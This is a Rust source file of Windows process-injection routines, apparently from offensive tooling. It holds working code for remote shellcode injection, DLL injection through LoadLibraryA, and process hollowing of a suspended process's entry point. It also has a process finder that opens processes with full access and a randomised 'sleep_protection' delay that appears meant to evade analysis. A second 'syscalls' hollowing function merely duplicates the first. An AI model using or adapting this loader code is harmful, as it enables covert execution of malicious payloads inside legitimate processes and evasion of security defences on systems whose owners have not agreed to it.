use core::ffi::c_void;
use rand;
use std::mem::{size_of, MaybeUninit};
use std::ptr;
use std::{thread, time};
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
use windows_sys::Win32::System::{
    Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, IMAGE_NT_HEADERS64},
    LibraryLoader::{GetModuleHandleA, GetProcAddress},
    Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
    ProcessStatus::{K32EnumProcesses, K32GetModuleBaseNameW},
    SystemServices::IMAGE_DOS_HEADER,
    Threading::{
        CreateProcessA, CreateRemoteThread, NtQueryInformationProcess, OpenProcess, ResumeThread,
        CREATE_SUSPENDED, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS, PROCESS_BASIC_INFORMATION,
        PROCESS_INFORMATION, STARTUPINFOA,
    },
};
pub fn inject_shellcode(process_name: String, buf: Vec<u8>) -> Result<HANDLE, &'static str> {
    let addr: *mut c_void;

    let h_process: HANDLE = find_process(process_name)?;

    println!("h_process: {:?}", h_process);
    unsafe {
        addr = VirtualAllocEx(
            h_process,
            ptr::null(),
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
    }

    println!("addr: {:?}", &addr);

    let mut nb_written_bytes = 0;
    let shellcode = buf.as_ptr() as *const c_void;

    if unsafe { WriteProcessMemory(h_process, addr, shellcode, buf.len(), &mut nb_written_bytes) }
        == 0
    {
        println!("Error in WriteProcessMemory");
        return Err("Couldn't write process memory");
    }

    let base_addr: LPTHREAD_START_ROUTINE;
    unsafe {
        base_addr = Some(
            *(&addr as *const _
                as *const extern "system" fn(lpthreadparameter: *mut c_void) -> u32),
        );
    }
    unsafe {
        Ok(CreateRemoteThread(
            h_process,
            ptr::null(),
            0,
            base_addr,
            ptr::null(),
            0,
            ptr::null_mut(),
        ))
    }
}

pub fn inject_dll(process_name: String, file_path: &str) -> Result<HANDLE, &'static str> {
    let addr: *mut c_void;

    //    1. Find process
    let h_process: HANDLE = find_process(process_name)?;

    //2. Allocate some memory
    println!("h_process: {:?}", h_process);
    unsafe {
        addr = VirtualAllocEx(
            h_process,
            ptr::null(),
            0x1000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
    }

    let mut nb_written_bytes = 0;
    //3. Write DLL path
    if unsafe {
        WriteProcessMemory(
            h_process,
            addr,
            file_path.as_ptr() as *const c_void,
            file_path.len(),
            &mut nb_written_bytes,
        )
    } == 0
    {
        println!("Error in WriteProcessMemory");
        return Err("Couldn't write process memory");
    }
    //    4. Find Kernel32 addr
    let k32: &str = "KERNEL32.DLL\0";
    let kernel32_addr = unsafe { GetModuleHandleA(k32.as_ptr()) };
    if kernel32_addr == 0 {
        return Err("Couldn't find kernel32");
    }
    println!("Found kernel32 address at: {:#x}", kernel32_addr);
    //    5. Find LoadLibraryA addr
    let proc_name: &str = "LoadLibraryA\0";
    let proc_addr = unsafe {
        GetProcAddress(kernel32_addr, proc_name.as_ptr()).expect("Couldn't find LoadLibraryA")
    } as usize;
    if proc_addr == 0 {
        return Err("Invalid LoadLibraryA address");
    }
    println!("Found LoadLibraryA address at: {:#x}", proc_addr);
    //    6. Start thread to load dll
    //
    let base_addr: LPTHREAD_START_ROUTINE;
    unsafe {
        base_addr = Some(
            *(&proc_addr as *const _
                as *const extern "system" fn(lpthreadparameter: *mut c_void) -> u32),
        );
    }
    let remote_thread_handle = unsafe {
        CreateRemoteThread(
            h_process,
            ptr::null(),
            0,
            base_addr,
            addr,
            0,
            ptr::null_mut(),
        )
    };
    if remote_thread_handle == 0 {
        Err("Couldn't create remote thread")
    } else {
        Ok(remote_thread_handle)
    }
    //    Ok(h_process)
}

pub fn inject_hollow(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str> {
    //    1. Start a process in suspended state
    let startup_info: STARTUPINFOA = unsafe { MaybeUninit::<STARTUPINFOA>::zeroed().assume_init() };
    let mut process_info: PROCESS_INFORMATION =
        unsafe { MaybeUninit::<PROCESS_INFORMATION>::zeroed().assume_init() };
    println!("Creating process");
    let create_process = unsafe {
        CreateProcessA(
            ptr::null(),
            exe_path.as_ptr() as *mut u8,
            ptr::null(),
            ptr::null(),
            0,
            CREATE_SUSPENDED,
            ptr::null(),
            ptr::null(),
            &startup_info,
            &mut process_info,
        )
    };
    if create_process == 0 {
        return Err("Could not create process");
    }
    println!("Created process: {:?}", process_info.hProcess);

    // 2. Locate PEB in created process
    println!("2.");
    sleep_protection();
    let mut nt_process_info = MaybeUninit::<PROCESS_BASIC_INFORMATION>::zeroed();
    let mut return_len: u32 = 0;
    let nt_process_info_result = unsafe {
        NtQueryInformationProcess(
            process_info.hProcess,
            0,
            nt_process_info.as_mut_ptr() as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        )
    };
    if nt_process_info_result != 0 {
        return Err("Couldn't run NtQueryInformationProcess");
    }
    let nt_process_info_safe = unsafe { nt_process_info.assume_init() };
    // 3. Calculate image base position
    let ptr_to_image_base = nt_process_info_safe.PebBaseAddress as u64 + 0x10;
    // 4. Use that to read the process memory
    sleep_protection();
    println!("4.");
    let mut image_base_buffer = [0; size_of::<&u8>()];
    let mut bytes_read: usize = 0;
    let memory = unsafe {
        ReadProcessMemory(
            process_info.hProcess,
            ptr_to_image_base as *mut c_void,
            image_base_buffer.as_mut_ptr() as *mut c_void,
            image_base_buffer.len(),
            &mut bytes_read,
        )
    };
    if memory == 0 || bytes_read == 0 {
        return Err("Couldn't get process memory");
    }
    let target_base = usize::from_ne_bytes(image_base_buffer);
    // 5. extract EntryPoint from PE header at target_base
    sleep_protection();
    let mut pe_header = MaybeUninit::<IMAGE_DOS_HEADER>::zeroed();
    let mut bytes_read: usize = 0;
    let memory = unsafe {
        ReadProcessMemory(
            process_info.hProcess,
            target_base as *mut c_void,
            pe_header.as_mut_ptr() as *mut c_void,
            size_of::<IMAGE_DOS_HEADER>(),
            &mut bytes_read,
        )
    };
    let pe_header_safe = unsafe { pe_header.assume_init() };
    if memory == 0 || bytes_read == 0 {
        return Err("Couldn't read PE header");
    }
    // 6. Use EntryPoint offset to read memory
    sleep_protection();
    let mut entrypoint = MaybeUninit::<IMAGE_NT_HEADERS64>::zeroed();
    let entrypoint_ptr_addr = target_base + (pe_header_safe.e_lfanew as usize);
    let mut bytes_read: usize = 0;
    let memory = unsafe {
        ReadProcessMemory(
            process_info.hProcess,
            entrypoint_ptr_addr as *mut c_void,
            entrypoint.as_mut_ptr() as *mut c_void,
            size_of::<IMAGE_NT_HEADERS64>(),
            &mut bytes_read,
        )
    };
    let entrypoint_safe = unsafe { entrypoint.assume_init() };
    if memory == 0 || bytes_read == 0 {
        return Err("Couldn't read Image NT header");
    }
    println!(
        "Entrypoint: {:#x}",
        entrypoint_safe.OptionalHeader.AddressOfEntryPoint
    );
    // 7. Write shellcode to the entrypoint
    sleep_protection();
    let mut nb_written_bytes = 0;
    let shellcode = buf.as_ptr() as *const c_void;
    let entrypoint_addr =
        target_base + (entrypoint_safe.OptionalHeader.AddressOfEntryPoint as usize);
    if unsafe {
        WriteProcessMemory(
            process_info.hProcess,
            entrypoint_addr as *mut c_void,
            shellcode,
            buf.len(),
            &mut nb_written_bytes,
        )
    } == 0
    {
        println!("{}", nb_written_bytes);
        return Err("Couldn't write shellcode");
    }

    // 8. Resume the thread
    if unsafe { ResumeThread(process_info.hThread) } == 0 {
        return Err("Couldn't resume thread");
    }

    // Success
    unsafe {
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }

    Ok(())
}


pub fn inject_hollow_syscalls(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str> {
    //    1. Start a process in suspended state
    let startup_info: STARTUPINFOA = unsafe { MaybeUninit::<STARTUPINFOA>::zeroed().assume_init() };
    let mut process_info: PROCESS_INFORMATION =
        unsafe { MaybeUninit::<PROCESS_INFORMATION>::zeroed().assume_init() };
    println!("Creating process");
    let create_process = unsafe {
        CreateProcessA(
            ptr::null(),
            exe_path.as_ptr() as *mut u8,
            ptr::null(),
            ptr::null(),
            0,
            CREATE_SUSPENDED,
            ptr::null(),
            ptr::null(),
            &startup_info,
            &mut process_info,
        )
    };
    if create_process == 0 {
        return Err("Could not create process");
    }
    println!("Created process: {:?}", process_info.hProcess);

    // 2. Locate PEB in created process
    println!("2.");
    sleep_protection();
    let mut nt_process_info = MaybeUninit::<PROCESS_BASIC_INFORMATION>::zeroed();
    let mut return_len: u32 = 0;
    let nt_process_info_result = unsafe {
        NtQueryInformationProcess(
            process_info.hProcess,
            0,
            nt_process_info.as_mut_ptr() as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        )
    };
    if nt_process_info_result != 0 {
        return Err("Couldn't run NtQueryInformationProcess");
    }
    let nt_process_info_safe = unsafe { nt_process_info.assume_init() };
    // 3. Calculate image base position
    let ptr_to_image_base = nt_process_info_safe.PebBaseAddress as u64 + 0x10;
    // 4. Use that to read the process memory
    sleep_protection();
    println!("4.");
    let mut image_base_buffer = [0; size_of::<&u8>()];
    let mut bytes_read: usize = 0;
    let memory = unsafe {
        ReadProcessMemory(
            process_info.hProcess,
            ptr_to_image_base as *mut c_void,
            image_base_buffer.as_mut_ptr() as *mut c_void,
            image_base_buffer.len(),
            &mut bytes_read,
        )
    };
    if memory == 0 || bytes_read == 0 {
        return Err("Couldn't get process memory");
    }
    let target_base = usize::from_ne_bytes(image_base_buffer);
    // 5. extract EntryPoint from PE header at target_base
    sleep_protection();
    let mut pe_header = MaybeUninit::<IMAGE_DOS_HEADER>::zeroed();
    let mut bytes_read: usize = 0;
    let memory = unsafe {
        ReadProcessMemory(
            process_info.hProcess,
            target_base as *mut c_void,
            pe_header.as_mut_ptr() as *mut c_void,
            size_of::<IMAGE_DOS_HEADER>(),
            &mut bytes_read,
        )
    };
    let pe_header_safe = unsafe { pe_header.assume_init() };
    if memory == 0 || bytes_read == 0 {
        return Err("Couldn't read PE header");
    }
    // 6. Use EntryPoint offset to read memory
    sleep_protection();
    let mut entrypoint = MaybeUninit::<IMAGE_NT_HEADERS64>::zeroed();
    let entrypoint_ptr_addr = target_base + (pe_header_safe.e_lfanew as usize);
    let mut bytes_read: usize = 0;
    let memory = unsafe {
        ReadProcessMemory(
            process_info.hProcess,
            entrypoint_ptr_addr as *mut c_void,
            entrypoint.as_mut_ptr() as *mut c_void,
            size_of::<IMAGE_NT_HEADERS64>(),
            &mut bytes_read,
        )
    };
    let entrypoint_safe = unsafe { entrypoint.assume_init() };
    if memory == 0 || bytes_read == 0 {
        return Err("Couldn't read Image NT header");
    }
    println!(
        "Entrypoint: {:#x}",
        entrypoint_safe.OptionalHeader.AddressOfEntryPoint
    );
    // 7. Write shellcode to the entrypoint
    sleep_protection();
    let mut nb_written_bytes = 0;
    let shellcode = buf.as_ptr() as *const c_void;
    let entrypoint_addr =
        target_base + (entrypoint_safe.OptionalHeader.AddressOfEntryPoint as usize);
    if unsafe {
        WriteProcessMemory(
            process_info.hProcess,
            entrypoint_addr as *mut c_void,
            shellcode,
            buf.len(),
            &mut nb_written_bytes,
        )
    } == 0
    {
        println!("{}", nb_written_bytes);
        return Err("Couldn't write shellcode");
    }

    // 8. Resume the thread
    if unsafe { ResumeThread(process_info.hThread) } == 0 {
        return Err("Couldn't resume thread");
    }

    // Success
    unsafe {
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }

    Ok(())
}

pub fn find_process(process_name: String) -> Result<HANDLE, &'static str> {
    let nb_process: usize;
    let mut process_array = Vec::<u32>::with_capacity(2048);
    let mut cb_needed = 0;

    //    1. create an array of all processes
    if unsafe {
        K32EnumProcesses(
            process_array.as_mut_ptr(),
            (process_array.capacity() * std::mem::size_of::<u32>()) as u32,
            &mut cb_needed,
        )
    } == 0
    {
        return Err("Could not enumerate processes.");
    } else {
        nb_process = (cb_needed as usize) / std::mem::size_of::<u32>();
        unsafe { process_array.set_len(nb_process) };
    }
    println!("Found {} processes.", nb_process);

    //    2. Open all processes and get their ModuleBaseName
    for pid in process_array {
        let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
        if h_process != 0 {
            let mut target_process_name = [0u16; 125];
            unsafe { K32GetModuleBaseNameW(h_process, 0, target_process_name.as_mut_ptr(), 125) };
            //                3. compare the process name
            if String::from_utf16_lossy(&target_process_name).contains(process_name.as_str()) {
                println!("Found process with id: {}", pid);
                println!("Process is: {}", String::from_utf16_lossy(&target_process_name));
                return Ok(h_process);
            } else {
                unsafe { CloseHandle(h_process) };
            }
        }
    }
    Err("Process not found :-(")
}

pub fn sleep_protection() {
    let time_to_sleep = time::Duration::from_millis(rand::random::<u8>() as u64 + 1234u64);
    let now = time::Instant::now();

    thread::sleep(time_to_sleep);

    assert!(now.elapsed() >= time_to_sleep);
}
